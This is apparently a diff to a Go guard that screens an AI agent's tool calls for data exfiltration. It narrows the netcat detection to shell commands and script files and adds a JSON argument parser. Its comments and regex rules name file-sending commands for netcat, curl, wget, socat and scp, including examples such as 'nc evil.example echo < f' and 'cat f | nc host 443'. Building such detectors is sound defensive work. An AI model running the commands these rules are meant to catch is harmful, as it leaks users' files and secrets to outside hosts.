@@ -34,31 +34,25 @@ const (
 	ruleOddKey      = "malformed-chunk"
 )
 
-// ncAddress is what netcat needs to reach anything before its input: shell words (options, not
-// Lean's ":" or ":="), then a host and a port. A port is a number, a range or a variable after
-// any word; a service name netcat looks up ("https", "echo") only after a word shaped like a host
-// (a dotted name, also one ending in a dot, an IPv4 or IPv6 address, a variable), since a list of names is never complete and a bare
-// word after a word is ordinary text. So "nc host 9000 < f" and "nc evil.example echo < f" are
-// transfers, while "have nc : a < b", "nc a b < c" and "nc x domain < y" are names and comparisons.
+// commandRules read only what a call runs: shell commands (the "command", "cmd" and "script"
+// arguments) and files written as shell scripts (a ".sh", ".bash", ".zsh" or ".ps1" path, or a
+// "#!" first line). Netcat is the case: as a command, netcat fed from a file, a here-document or a
+// pipe is a transfer whatever the order of its words ("nc < f host 443", "nc host < f 443",
+// "cat f | nc host 443"), while in a Lean or Python file "nc" is a name and "<" a comparison, which
+// held nodes for ordinary proofs (2026-10-31; code review 2026-11-10). A command word is at a line
+// start or after ; & | ( ` $( or a quote, also after sudo, exec, env, nohup, command or timeout.
 const (
-	ncWord    = `(?:-[^\s<>]+|["'\w$\[{][^\s<>|;&]*)`
-	ncNumPort = `["']?(?:\d{1,5}(?:-\d{1,5})?|\$\{?\w+\}?)["']?`
-	ncHost    = `["']?(?:\$\{?\w+\}?|\[?` + ncIPv6 + `(?:%\w+)?\]?|[\w-]+(?:\.[\w-]+)*\.|[\w-]+(?:\.[\w-]+)+|localhost)["']?`
-	// ncIPv6: hex groups and at least two colons, an IPv4 tail allowed, never colons alone. No
-	// bound on the groups: a tripwire may take an invalid address, it must not miss a valid one.
-	ncIPv6     = `(?:[0-9A-Fa-f]{1,4}:(?:[0-9A-Fa-f]{0,4}:)+(?:[0-9A-Fa-f]{1,4}|` + ncIPv4 + `)?|(?:[0-9A-Fa-f]{0,4}:){2,}(?:[0-9A-Fa-f]{1,4}|` + ncIPv4 + `))`
-	ncIPv4     = `\d{1,3}(?:\.\d{1,3}){3}`
-	ncName     = `["']?[A-Za-z][\w-]*["']?`
-	ncAddress  = `(?:\s+` + ncWord + `)*\s+(?:` + ncWord + `\s+` + ncNumPort + `|` + ncHost + `\s+` + ncName + `)`
-	ncAfter    = `(?:\s+-[^\s<>]+|\s*(?:\d?>{1,2}&?|&>{1,2})\s*[^\s<>]+)*` // options and output redirections
-	ncRedirect = `\s*\d?<\s*\S`
-	// The input redirection can also come first ("nc < f host 443", code review 2026-11-10). That
-	// form needs a host that looks like one (a dotted name, an address or a variable) and a numeric
-	// or variable port, because the guard also reads file contents: Lean such as
-	// "(h : nc x.val < f n)" or "nc < f x 3" must stay text. Not covered: "nc host < f 443".
-	ncCommand = `\b(?:nc|ncat|netcat)(?:\.\w+)?["']?(?:\s+-[^\s<>]+)*`
-	ncIn      = `\s*\d?<\s*[^\s<>|;&]+`
+	ncLead = `(?:^|[;&|(` + "`" + `'"]|\$\()\s*`
+	ncProg = `(?:(?:sudo|exec|env|nohup|command|timeout\s+\S+)\s+(?:-\S+\s+)*)*(?:\S*/)?(?:nc|ncat|netcat)(?:\.exe)?\b`
 )
+
+var commandRules = []struct {
+	rule, why string
+	re        *regexp.Regexp
+}{
+	{ruleUpload, "netcat sending a file to a host and port", regexp.MustCompile(`(?m)` + ncLead + ncProg + `(?:[^;&|\n]|&>|>&)*<`)},
+	{ruleUpload, "netcat sending piped input to a host", regexp.MustCompile(`\|&?\s*` + ncProg + `\s+\S`)},
+}
 
 // guardRules match dangerous tool calls. Credential paths are excused when the request
 // itself names them ("put the key in .env"): the node cannot add text to the request. why is
@@ -78,8 +72,6 @@ var guardRules = []struct {
 	{ruleUpload, "curl sending a file as form or data", regexp.MustCompile(`\bcurl\b[^\n]*\s(?:-d|--data(?:-binary|-raw|-urlencode)?|-F|--form)\s*["']?(?:[\w.-]+=)?@`)},
 	{ruleUpload, "curl uploading a file", regexp.MustCompile(`\bcurl\b[^\n]*\s(?:-T|--upload-file)\s`)},
 	{ruleUpload, "wget posting a file", regexp.MustCompile(`\bwget\b[^\n]*--post-file`)},
-	{ruleUpload, "netcat sending a file to a host and port", regexp.MustCompile(`\b(?:nc|ncat|netcat)(?:\.\w+)?["']?` + ncAddress + ncAfter + ncRedirect)},
-	{ruleUpload, "netcat sending a file to a host and port", regexp.MustCompile(ncCommand + ncIn + `(?:\s+-[^\s<>]+)*\s+` + ncHost + `\s+` + ncNumPort + `(?:$|[\s;&|)])`)},
 	{ruleUpload, "socat sending a file", regexp.MustCompile(`\bsocat\s(?:[^\n|;&<]|\d*>&|&>)*<\s*\S`)},
 	{ruleUpload, "scp or rsync to a remote host", regexp.MustCompile(`\b(?:scp|rsync)\b[^\n]*\s(?:[\w.-]+@)?[A-Za-z0-9.-]+\.[A-Za-z]{2,}:`)},
 }
@@ -217,10 +209,76 @@ func checkToolCall(name, args, req string) guardHit {
 			return guardHit{r.rule, r.why}
 		}
 	}
+	cmds := commandText(name, args)
+	for _, r := range commandRules {
+		if r.re.MatchString(cmds) {
+			return guardHit{r.rule, r.why}
+		}
+	}
 	if unknownHost(text, req) != "" {
 		return guardHit{ruleUnknownURL, whyUnknownURL}
 	}
 	return guardHit{}
+}
+
+// cmdLines joins shell line continuations and keeps each line its own, so a command word
+// stays at a line start.
+var cmdLines = strings.NewReplacer("\\\r\n", " ", "\\\n", " ", "\r\n", "\n", "\r", "\n")
+
+// commandText is what commandRules read: the call's "command", "cmd" and "script" strings, and
+// the text of a file written as a shell script (a ".sh", ".bash", ".zsh" or ".ps1" path, or a "#!"
+// first line), one per line. Every value of a key given twice counts, whichever one a client
+// takes. Arguments that are not a JSON object are read whole, as they came.
+func commandText(name, args string) string {
+	vals := map[string][]string{}
+	d := json.NewDecoder(strings.NewReader(args))
+	ok := false
+	if t, err := d.Token(); err == nil && t == json.Delim('{') {
+		ok = true
+		for d.More() {
+			k, err := d.Token()
+			var raw json.RawMessage
+			if err != nil || d.Decode(&raw) != nil {
+				ok = false
+				break
+			}
+			var v string
+			if key, isKey := k.(string); isKey && json.Unmarshal(raw, &v) == nil {
+				vals[key] = append(vals[key], v)
+			}
+		}
+	}
+	if !ok {
+		return cmdLines.Replace(strings.ReplaceAll(args, `\n`, "\n"))
+	}
+	var b strings.Builder
+	add := func(keys ...string) {
+		for _, k := range keys {
+			for _, v := range vals[k] {
+				b.WriteString(v)
+				b.WriteByte('\n')
+			}
+		}
+	}
+	add("command", "cmd", "script")
+	script := false
+	for _, k := range []string{"filePath", "path", "file_path"} {
+		for _, p := range vals[k] {
+			p = strings.ToLower(p)
+			for _, ext := range []string{".sh", ".bash", ".zsh", ".ps1"} {
+				script = script || strings.HasSuffix(p, ext)
+			}
+		}
+	}
+	for _, k := range []string{"content", "newString", "new_string"} {
+		for _, c := range vals[k] {
+			if script || strings.HasPrefix(c, "#!") {
+				b.WriteString(c)
+				b.WriteByte('\n')
+			}
+		}
+	}
+	return cmdLines.Replace(b.String())
 }
 
 // maxGuardText bounds the answer text kept for the address check, and maxHeldArgs the tool
